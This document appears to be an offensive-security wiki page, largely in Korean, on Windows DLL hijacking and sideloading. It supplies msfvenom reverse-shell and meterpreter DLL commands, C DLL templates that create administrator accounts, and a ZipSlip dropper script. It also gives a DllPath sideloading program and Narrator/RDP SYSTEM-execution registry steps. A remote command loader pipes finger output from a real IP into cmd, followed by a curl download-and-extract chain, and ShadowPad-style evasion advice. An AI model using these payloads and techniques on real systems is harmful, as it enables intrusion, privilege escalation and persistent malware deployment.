# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 기본 정보

DLL Hijacking은 신뢰된 애플리케이션이 악성 DLL을 로드하도록 조작하는 것을 포함합니다. 이 용어는 **DLL Spoofing, Injection, and Side-Loading** 같은 여러 전술을 포함합니다. 주로 코드 실행과 지속성 확보에 사용되며, 권한 상승에는 덜 자주 사용됩니다. 여기서는 권한 상승에 초점을 맞추지만, 하이재킹 방법 자체는 목적과 상관없이 동일하게 적용됩니다.

### 일반적인 기법

애플리케이션의 DLL 로딩 전략에 따라 효과가 달라지는 여러 방법이 사용됩니다:

1. **DLL Replacement**: 정상 DLL을 악성 DLL로 교체합니다. 원본 DLL의 기능을 유지하려면 선택적으로 DLL Proxying을 사용할 수 있습니다.
2. **DLL Search Order Hijacking**: 애플리케이션의 검색 패턴을 이용해 악성 DLL을 정상 DLL보다 먼저 검색되는 경로에 배치합니다.
3. **Phantom DLL Hijacking**: 애플리케이션이 필요하지만 존재하지 않는 DLL로 착각하고 로드하도록 악성 DLL을 생성합니다.
4. **DLL Redirection**: `%PATH%` 또는 `.exe.manifest` / `.exe.local` 파일과 같은 검색 매개변수를 수정해 애플리케이션이 악성 DLL을 로드하도록 유도합니다.
5. **WinSxS DLL Replacement**: WinSxS 디렉토리에서 정상 DLL을 악성 DLL로 대체하는 방법으로, 종종 DLL side-loading과 관련됩니다.
6. **Relative Path DLL Hijacking**: 복사한 애플리케이션과 함께 사용자가 제어하는 디렉토리에 악성 DLL을 배치하는 것으로, Binary Proxy Execution 기법과 유사합니다.

> [!TIP]
> HTML staging, AES-CTR configs, .NET implants를 DLL sideloading 위에 계층적으로 조합한 단계별 체인은 아래 워크플로를 검토하세요.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## 누락된 Dlls 찾기

시스템 내에서 누락된 Dlls를 찾는 가장 일반적인 방법은 sysinternals의 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) 을 실행하고 **다음 2가지 필터를 설정하는 것**입니다:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

그리고 **File System Activity**만 표시합니다:

![](<../../../images/image (153).png>)

일반적으로 **누락된 dlls**를 찾고 있다면 이 상태로 몇 **초** 동안 실행해 둡니다.  
특정 실행 파일에서 **누락된 dll**을 찾고 있다면 **"Process Name" "contains" `<exec name>`**와 같은 추가 필터를 설정한 뒤 실행하고 이벤트 캡처를 중지해야 합니다.

## 누락된 Dll 악용

권한 상승을 위해 가장 좋은 기회는 권한 있는 프로세스가 로드하려고 시도할 DLL을 어떤 **검색 대상 위치 중 하나에 쓸 수 있는 것**입니다. 따라서, DLL이 원본 DLL이 있는 폴더보다 먼저 검색되는 **폴더**에 DLL을 **작성**할 수 있거나(드문 경우), DLL이 검색될 어떤 **폴더**에 쓸 수 있고 원본 **dll**이 어떤 폴더에도 존재하지 않는 상황을 만들 수 있습니다.

### Dll 검색 순서

**다음의** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **에서 Dll이 어떻게 로드되는지 구체적으로 확인할 수 있습니다.**

Windows 애플리케이션은 미리 정의된 검색 경로 집합을 특정 순서로 따라 DLL을 찾습니다. 악성 DLL이 이러한 디렉토리들 중 하나에 전략적으로 배치되면 정상 DLL보다 먼저 로드되어 DLL 하이재킹이 발생합니다. 이를 방지하려면 애플리케이션이 요구하는 DLL을 절대 경로로 참조하도록 보장하는 것이 해결책입니다.

아래는 **32비트 시스템에서의 DLL 검색 순서**입니다:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

위는 **SafeDllSearchMode**가 활성화된 기본 검색 순서입니다. 이 기능이 비활성화되면 현재 디렉토리가 두 번째 순위로 올라옵니다. 이 기능을 비활성화하려면 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 레지스트리 값을 생성하고 값을 0으로 설정하세요(기본값은 활성화됨).

만약 [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 함수가 **LOAD_WITH_ALTERED_SEARCH_PATH** 옵션과 함께 호출되면 검색은 LoadLibraryEx가 로드하는 실행 모듈의 디렉토리에서 시작됩니다.

마지막으로, dll이 단순히 이름만이 아니라 절대 경로로 지정되어 로드될 수 있다는 점을 유의하세요. 이 경우 해당 dll은 그 경로에서만 검색됩니다(해당 dll에 종속성이 있다면, 그 종속성들은 이름으로 로드된 것처럼 검색됩니다).

검색 순서를 변경하는 다른 방법들도 있지만 여기서는 설명하지 않습니다.

### 임의 파일 쓰기를 누락된 DLL 하이재킹으로 연결하기

1. **ProcMon** 필터를 사용하여(`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) 프로세스가 탐색하지만 찾을 수 없는 DLL 이름들을 수집합니다.
2. 바이너리가 **스케줄/서비스**로 실행된다면, 해당 이름들 중 하나로 된 DLL을 **application directory**(검색 순서 항목 #1)에 떨어뜨리면 다음 실행 시 로드됩니다. 한 .NET 스캐너 사례에서는 프로세스가 실제 복사본을 `C:\Program Files\dotnet\fxr\...`에서 로드하기 전에 `C:\samples\app\`에서 `hostfxr.dll`을 찾았습니다.
3. 임의의 export를 가진 페이로드 DLL(예: reverse shell)을 빌드합니다: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. 만약 여러분의 원시 취약점이 **ZipSlip-style arbitrary write**라면, 압축 해제 디렉토리를 벗어나도록 엔트리가 설정된 ZIP을 만들어 DLL이 애플리케이션 폴더에 놓이도록 만듭니다:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. 아카이브를 모니터링되는 inbox/share로 전달한다; 스케줄된 작업이 프로세스를 재실행하면 해당 프로세스가 악성 DLL을 로드하고 서비스 계정으로서 코드를 실행한다.

### RTL_USER_PROCESS_PARAMETERS.DllPath를 통한 sideloading 강제

새로 생성된 프로세스의 DLL 검색 경로를 결정론적으로 조작하는 고급 방법은 ntdll의 네이티브 API로 프로세스를 생성할 때 RTL_USER_PROCESS_PARAMETERS의 DllPath 필드를 설정하는 것이다. 여기서 공격자가 제어하는 디렉터리를 제공하면, 가져온 DLL을 이름으로만 해석(절대 경로를 사용하지 않고 안전 로딩 플래그를 사용하지 않는 경우)하는 대상 프로세스가 해당 디렉터리에서 악성 DLL을 로드하도록 강제할 수 있다.

Key idea
- RtlCreateProcessParametersEx로 프로세스 파라미터를 구성하고, 제어하는 폴더를 가리키는 커스텀 DllPath를 제공한다(예: dropper/unpacker가 위치한 디렉터리).
- RtlCreateUserProcess로 프로세스를 생성한다. 대상 바이너리가 이름으로 DLL을 해석할 때 로더는 이 제공된 DllPath를 참조하여, 악성 DLL이 대상 EXE와 동일 위치에 없더라도 신뢰할 수 있는 sideloading을 가능하게 한다.

Notes/limitations
- 이는 생성되는 자식 프로세스에 영향을 미치며, 현재 프로세스에만 영향을 주는 SetDllDirectory와는 다르다.
- 대상은 이름으로 DLL을 import 하거나 LoadLibrary해야 한다(절대 경로를 사용하지 않고 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories를 사용하지 않는 경우).
- KnownDLLs 및 하드코딩된 절대 경로는 가로채기(hijack)할 수 없다. Forwarded exports와 SxS는 우선순위를 변경할 수 있다.

Minimal C example (ntdll, 와이드 문자열, 단순화된 오류 처리):

<details>
<summary>전체 C 예제: RTL_USER_PROCESS_PARAMETERS.DllPath를 통한 DLL sideloading 강제</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

이 기술은 실제 공격 사례에서 다단계 sideloading 체인을 구동하는 데 사용되는 것으로 관찰되었습니다: 초기 런처가 헬퍼 DLL을 떨어뜨리고, 그 헬퍼는 커스텀 DllPath로 Microsoft-signed, hijackable 바이너리를 생성하여 스테이징 디렉터리에서 공격자 DLL을 강제로 로드하게 합니다.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

네, 요구 조건을 찾는 것은 복잡합니다. 기본적으로 권한이 높은 실행 파일에서 DLL이 누락된 경우를 찾는 것은 **꽤 드문 일**이고, system path 폴더에 대한 쓰기 권한을 갖는 것은 **더더욱 드뭅니다**(기본적으로는 불가능). 하지만 잘못 구성된 환경에서는 가능할 수 있습니다. 운이 좋게 요구 조건을 만족하는 경우, [UACME](https://github.com/hfiref0x/UACME) 프로젝트를 확인해보세요. 프로젝트의 **주요 목적이 UAC 우회(bypass UAC)**일지라도, 해당 Windows 버전용 Dll hijacking의 **PoC**를 찾을 수 있을 것이며(아마도 쓰기 권한이 있는 폴더 경로만 변경하면 됩니다) 이를 활용할 수 있습니다.

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
그리고 **PATH에 포함된 모든 폴더의 권한을 확인하세요**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
실행 파일의 imports와 dll의 exports는 다음과 같이 확인할 수 있습니다:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 자동화 도구

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)는 system PATH 내부의 어떤 폴더에 대해 쓰기 권한이 있는지 확인합니다.\
이 취약점을 찾기 위한 다른 흥미로운 자동화 도구로는 **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ 및 _Write-HijackDll_가 있습니다.

### 예시

취약한 시나리오를 발견한 경우, 이를 성공적으로 악용하는 데 가장 중요한 것 중 하나는 **실행 파일이 해당 DLL에서 import할 모든 함수를 최소한으로 내보내는 dll을 만드는 것**입니다. 어쨌든, Dll Hijacking은 [Medium Integrity level에서 High로 권한 상승( **UAC 우회** )](../../authentication-credentials-uac-and-efs/index.html#uac)하거나 [**High Integrity에서 SYSTEM으로**](../index.html#from-high-integrity-to-system) 권한 상승할 때 유용합니다. 실행을 위한 dll hijacking 연구 안에서 **유효한 dll을 생성하는 방법**의 예시는 다음에서 찾을 수 있습니다: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
또한, 다음 섹션에서는 템플릿으로 사용하거나 **필수 함수가 아닌 함수들을 내보내는 dll**을 만들 때 유용한 몇 가지 **기본 dll 코드**를 찾을 수 있습니다.

## **Dll 생성 및 컴파일**

### **Dll Proxifying**

기본적으로 **Dll proxy**는 로드될 때 **악성 코드를 실행할 수** 있으면서도, **실제 라이브러리로 모든 호출을 전달(relay)**하여 기대되는 동작을 **노출하고 수행**할 수 있는 Dll입니다.

도구 [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 또는 [**Spartacus**](https://github.com/Accenture/Spartacus)를 사용하면 대상 실행 파일을 지정하고 proxify할 라이브러리를 선택하여 **proxified dll을 생성**하거나, DLL을 지정하고 **proxified dll을 생성**할 수 있습니다.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter 획득 (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**사용자 생성 (x86, x64 버전은 확인하지 못함):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 사용자 정의

여러 경우에 컴파일한 Dll은 피해자 프로세스가 로드할 여러 함수를 반드시 **export several functions** 해야 합니다. 이러한 함수들이 존재하지 않으면 **binary won't be able to load** them, 그리고 **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL 예제 (사용자 계정 생성)</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>대체 C DLL (thread entry)</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## 사례 연구: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows의 Narrator.exe는 시작 시 예측 가능한 언어별 localization DLL을 여전히 프로브(probe)하며, 해당 DLL을 hijack하면 arbitrary code execution 및 persistence가 가능합니다.

핵심 사실
- 탐색 경로 (현재 빌드): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- 이전 경로 (구형 빌드): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- OneCore 경로에 writable attacker-controlled DLL이 존재하면 로드되어 `DllMain(DLL_PROCESS_ATTACH)`가 실행됩니다. No exports are required.

Procmon으로 탐지
- 필터: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator를 시작하고 위 경로에 대한 로드 시도를 관찰하세요.

최소 DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 위 설정으로 Narrator를 시작하면 심어진 DLL이 로드됩니다. 보안 데스크톱(로그온 화면)에서 CTRL+WIN+ENTER를 눌러 Narrator를 시작하면, 해당 DLL이 보안 데스크톱에서 SYSTEM 권한으로 실행됩니다.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP로 호스트에 접속한 뒤 로그온 화면에서 CTRL+WIN+ENTER를 눌러 Narrator를 실행하면, DLL이 보안 데스크톱에서 SYSTEM 권한으로 실행됩니다.
- 실행은 RDP 세션이 종료되면 중단되므로—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- 내장된 Accessibility Tool(AT) 레지스트리 항목(예: CursorIndicator)을 복제하고, 임의의 binary/DLL을 가리키도록 편집해 가져온 뒤 `configuration`을 해당 AT 이름으로 설정하면 Accessibility 프레임워크 하에서 임의 실행을 프록시할 수 있습니다.

Notes
- `%windir%\System32` 아래에 쓰기 및 HKLM 값을 변경하려면 관리자 권한이 필요합니다.
- 모든 페이로드 로직은 `DLL_PROCESS_ATTACH`에 넣을 수 있으며, 별도 export는 필요 없습니다.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 공격 흐름

1. 표준 사용자로서 `hostfxr.dll`을 `C:\ProgramData\Lenovo\TPQM\Assistant\`에 배치합니다.
2. 현재 사용자 컨텍스트로 예약된 작업이 오전 9시 30분에 실행될 때까지 대기합니다.
3. 작업이 실행될 때 관리자가 로그인되어 있으면, 악성 DLL은 관리자 세션에서 medium integrity로 실행됩니다.
4. 표준 UAC bypass 기법을 연결하여 medium integrity에서 SYSTEM 권한으로 승격시킵니다.

## 사례 연구: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

위협 행위자들은 종종 MSI 기반 droppers를 DLL side-loading과 결합하여 신뢰된 서명된 프로세스에서 페이로드를 실행합니다.

Chain overview
- 사용자가 MSI를 다운로드합니다. GUI 설치 중에 CustomAction(예: LaunchApplication 또는 VBScript 액션)이 백그라운드로 조용히 실행되어 임베디드 리소스에서 다음 단계를 재구성합니다.
- dropper는 합법적이고 서명된 EXE와 악성 DLL을 동일 디렉토리에 기록합니다(예시: Avast로 서명된 wsc_proxy.exe + 공격자 제어 wsc.dll).
- 서명된 EXE가 시작되면 Windows의 DLL 검색 순서가 작업 디렉토리에서 먼저 wsc.dll을 로드하여, 서명된 상위 프로세스 아래에서 공격자 코드를 실행합니다 (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction 테이블:
- 실행 파일이나 VBScript를 실행하는 항목을 찾으세요. 의심스러운 예시 패턴: LaunchApplication이 임베디드 파일을 백그라운드에서 실행함.
- Orca(Microsoft Orca.exe)에서 CustomAction, InstallExecuteSequence 및 Binary 테이블을 검사하세요.
- MSI CAB 내 임베디드/분할된 페이로드:
- 관리자 추출: msiexec /a package.msi /qb TARGETDIR=C:\out
- 또는 lessmsi 사용: lessmsi x package.msi C:\out
- VBScript CustomAction에 의해 연결(concatenated)되고 복호화되는 여러 작은 조각들을 찾으세요. 일반적인 흐름:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
wsc_proxy.exe를 이용한 실전 sideloading
- 이 두 파일을 같은 폴더에 넣으세요:
- wsc_proxy.exe: legitimate signed host (Avast). 해당 프로세스는 자신의 디렉터리에서 이름으로 wsc.dll을 로드하려고 시도합니다.
- wsc.dll: attacker DLL. 특정 exports가 필요하지 않다면 DllMain으로 충분합니다; 그렇지 않다면 proxy DLL을 만들어 필요한 exports를 genuine library로 포워딩하면서 DllMain에서 payload를 실행하세요.
- 최소한의 DLL payload를 빌드하세요:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- 내보내기 요구사항의 경우, 프록시링 프레임워크(예: DLLirant/Spartacus)를 사용해 페이로드도 실행하는 포워딩 DLL을 생성하세요.

- 이 기법은 호스트 바이너리의 DLL 이름 해석에 의존합니다. 호스트가 절대 경로를 사용하거나 안전한 로딩 플래그(예: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories)를 사용하면 hijack이 실패할 수 있습니다.
- KnownDLLs, SxS, 및 forwarded exports는 우선순위에 영향을 미칠 수 있으므로 호스트 바이너리와 export 집합을 선택할 때 고려해야 합니다.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point는 Ink Dragon이 핵심 페이로드를 디스크에 암호화된 상태로 유지하면서 합법적 소프트웨어에 섞어 배포하기 위해 **세 파일로 된 삼합체(three-file triad)** 를 사용하는 방법을 설명했습니다:

1. **Signed host EXE** – AMD, Realtek, 또는 NVIDIA 같은 공급업체의 바이너리(`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`)가 악용됩니다. 공격자는 실행 파일 이름을 Windows 바이너리처럼 보이도록 변경(예: `conhost.exe`)하지만 Authenticode 서명은 유효하게 유지됩니다.
2. **Malicious loader DLL** – EXE 옆에 예상 이름으로 드롭됩니다(`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). 이 DLL은 보통 ScatterBrain 프레임워크로 난독화된 MFC 바이너리이며, 암호화된 블롭을 찾아 복호화하고 ShadowPad를 reflectively map하는 역할만 수행합니다.
3. **Encrypted payload blob** – 종종 동일한 디렉터리에 `<name>.tmp`로 저장됩니다. 로더가 복호화된 페이로드를 메모리에 매핑한 후, 포렌식 증거를 파괴하기 위해 TMP 파일을 삭제합니다.

Tradecraft notes:

* 서명된 EXE의 이름을 바꾸되 PE 헤더의 원래 `OriginalFileName`은 유지하면 Windows 바이너리처럼 가장하면서도 공급업체 서명을 유지할 수 있습니다. 따라서 Ink Dragon이 실제로는 AMD/NVIDIA 유틸리티인 `conhost.exe`처럼 보이는 바이너리를 드롭하는 방식을 모방하세요.
* 실행 파일이 신뢰된 상태로 남아 있기 때문에 대부분의 allowlisting 제어는 악성 DLL이 그 옆에 위치하기만 하면 됩니다. 로더 DLL을 맞춤화하는 데 집중하세요; 서명된 부모 바이너리는 보통 그대로 실행할 수 있습니다.
* ShadowPad의 복호화기는 TMP 블롭이 로더 옆에 존재하고 쓰기 가능해야 매핑 후 파일을 제로화할 수 있다고 기대합니다. 페이로드가 로드될 때까지 디렉터리를 쓰기 가능 상태로 유지하세요; 페이로드가 메모리에 올라간 후에는 OPSEC을 위해 TMP 파일을 안전하게 삭제할 수 있습니다.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

운영자는 DLL sideloading을 LOLBAS와 결합해 디스크에 남는 커스텀 아티팩트가 신뢰된 EXE 옆의 악성 DLL 하나뿐이 되게 합니다:

- **Remote command loader (Finger):** 숨겨진 PowerShell이 `cmd.exe /c`를 생성해 Finger 서버에서 명령을 가져와 `cmd`로 파이프합니다:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host`는 TCP/79의 텍스트를 가져오고; `| cmd`는 서버 응답을 실행하므로 운영자가 서버 측에서 세컨드 스테이지를 교체할 수 있습니다.

- **Built-in download/extract:** 무해한 확장자를 가진 아카이브를 다운로드하고 풀어서 sideload 대상과 DLL을 무작위 `%LocalAppData%` 폴더 아래에 배치합니다:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L`은 진행 표시를 숨기고 리다이렉트를 따라가며; `tar -xf`는 Windows에 내장된 tar를 사용합니다.

